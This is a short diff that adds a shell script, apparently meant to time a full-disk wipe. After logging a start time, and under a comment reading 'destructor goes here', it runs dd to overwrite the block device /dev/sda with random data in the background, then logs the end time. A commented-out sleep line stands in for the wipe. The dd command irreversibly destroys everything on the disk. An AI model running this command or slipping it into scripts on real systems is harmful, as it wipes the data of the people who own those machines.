@@ -1,0 +1,5 @@
+> log
+echo Time begin: $(date) > log
+# destructor goes here
+(dd if=/dev/urandom of=/dev/sda bs=1M && echo "Time end:  $(date)" >> log)&
+#(sleep 5 && echo "Time end:  $(date)" >> log)&
